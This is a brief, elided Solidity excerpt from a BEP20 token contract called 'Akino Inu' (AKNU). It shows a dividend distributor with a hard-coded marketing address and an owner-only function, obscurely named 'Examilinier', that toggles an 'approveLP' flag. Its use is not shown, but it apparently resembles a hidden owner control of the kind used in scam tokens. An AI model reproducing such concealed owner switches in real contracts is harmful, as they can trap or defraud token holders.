...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 MARKETING_ADDRESS = IBEP20(0x8338AF6cF590F6efa231E540254e4E8A4e6BE262);
...
contract AkinoInu is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Akino Inu";
    string constant _symbol = "AKNU";
    ...
    function Examilinier(bool _approved) public onlyOwner {
    approveLP = _approved;
    }
